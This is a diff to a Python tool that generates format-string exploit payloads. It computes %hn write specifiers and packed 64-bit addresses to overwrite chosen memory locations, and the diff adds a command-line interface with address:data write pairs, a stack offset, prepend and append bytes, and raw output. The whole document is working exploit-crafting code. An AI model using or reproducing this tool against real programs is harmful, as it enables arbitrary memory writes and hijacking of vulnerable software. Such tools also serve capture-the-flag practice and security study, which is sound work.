@@ -1,14 +1,16 @@
 from colorama import Fore, Style
+import argparse
 
 class FormatString:
-	def __init__(self,writes: dict,offset=0):
+	def __init__(self,writes: dict,prepend: str,append: str,offset=0):
 		self.writes = writes
+		self.prepend = prepend.encode()
+		self.append = append.encode()
 		self.offset = offset
 		self.formatString = b''
 		self.padding = 0
-		self.unnecessaryHeader()
 
-	def unnecessaryHeader(self):
+	def unnecessaryHeader():
 		print(Fore.CYAN+Style.BRIGHT+'  __       _         ')
 		print(Fore.CYAN+Style.NORMAL+' / _|     | |        ')
 		print(Fore.CYAN+Style.DIM+'| |_  ___ | |_  _ __ ')
@@ -33,7 +35,6 @@ class FormatString:
 		# Each address is split into 4 separate addresses for each word of the desired 64-bit region
 		parsedWrites = self._parseDictToList(self.writes)
 		splitWrites = self._splitWrites(parsedWrites)
-		self.debug(splitWrites)
 		addresses = b''
 		for address,data,size in splitWrites:
 			addresses += self._intToPointer64(address)
@@ -48,12 +49,11 @@ class FormatString:
 		# For example, %1337x%999$hn
 		#
 		# This should not be a problem for most use cases, but it can be patched to a higher number if needed.
-		finalBString = self._craftFinalString(formatSpecifiers,addresses)
+		finalBString = self._craftFinalString(formatSpecifiers,addresses) + self.append
 
 		return finalBString
 
 	def craft(self):
-		self.debug(self._parseDictToList(self.writes))
 		self.formatString = self._createFormatString()
 		self.info(self.formatString)
 		self.info(f'Length: {len(self.formatString)}')
@@ -93,7 +93,7 @@ class FormatString:
 	# This function relies on the 'writes' parameter being sorted by index 1 in each element
 	def _createFormatSpecifiers(self,writes):
 		totalWritten = 0
-		formatSpecifiers = b''
+		formatSpecifiers = self.prepend
 		for address,data,size in writes:
 			if data == 0:
 				match size:
@@ -148,6 +148,35 @@ class FormatString:
 			strlen += len(str(num))
 		return strlen
 
+def main():
+	# Handle cli use
+	argParser = argparse.ArgumentParser('Craft format string payloads')
+	argParser.add_argument('-w','--write',action='append',help='REQUIRED. Specify a single address:data pair in hex, i.e 0x404000:0x1337. Can be used multiple times.',type=str)
+	argParser.add_argument('-o','--offset',default=0,help='Specify offset at which your input is found using a format string vulnerability',type=int)
+	argParser.add_argument('-p','--prepend',default='',help='Specify a bytestring to prepend to the payload',type=str)
+	argParser.add_argument('-a','--append',default='',help='Specify a bytestring to append to the payload',type=str)
+	argParser.add_argument('--raw',action='store_true',help='Outputs the only final payload as raw bytes.')
+	args = vars(argParser.parse_args())
 
-fmtstr = FormatString({0x7fffffffdc00:0x401012},offset=6)
-fmtstr.craft()
+	if args['write'] and args['raw']:
+		writes = parseWrites(args['write'])
+		fmtstr = FormatString(writes=writes,prepend=args['prepend'],append=args['append'],offset=args['offset'])
+		print(fmtstr._createFormatString().decode())
+	elif args['write'] and not args['raw']:
+		FormatString.unnecessaryHeader()
+		writes = parseWrites(args['write'])
+		fmtstr = FormatString(writes=writes,prepend=args['prepend'],append=args['append'],offset=args['offset'])
+		fmtstr.craft()
+	else:
+		FormatString.unnecessaryHeader()
+		argParser.print_help()
+
+def parseWrites(writes):
+    writesDict = {}
+    for write in writes:
+        address, data = write.split(":")
+        writesDict[int(address, 16)] = int(data,16)
+    return writesDict
+
+if __name__ == '__main__':
+	main()
